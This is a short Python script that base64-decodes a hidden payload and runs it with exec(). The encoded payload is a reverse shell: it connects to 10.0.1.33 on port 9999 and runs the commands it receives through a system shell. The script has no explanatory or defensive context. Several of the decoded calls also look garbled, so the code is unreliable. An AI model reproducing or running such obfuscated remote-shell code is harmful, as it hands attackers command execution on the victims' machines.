import base64

def run_shellcode():
    try:
        shellcode = base64.b64decode(encoded_shellcode).decode()
        exec(shellcode)
    except Exception as e:
        print(f"[!] Shellcode execution failed: {e}")

encoded_shellcode = (
    "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCkNMSUVOVF9JUD0iMTAuMC4xLjMzIgpDTElFTlRfUE9SVD05OTk5"
    "CnMgPSBzb2NrZXQuc29ja2V0KCkKcy5jb25uZWN0KChDTElFTlRfSVAsIENMSUVOVF9QT1JUKSkKcy5kdXAo"
    "cy5maWxlbm8oKSwgMCkKb3MuZHVwMihmaWxlbm49MCwgZHN0aW49MCkKb3MuZHVwMChmaWxlbm49MCwgZHNv"
    "dXQ9MCkKc3VicHJvY2Vzcy5jYWxsKHMucmVjdigxMDI0KS5zdHJpcCgpLCBzaGVsbD1UcnVlKQ=="
)
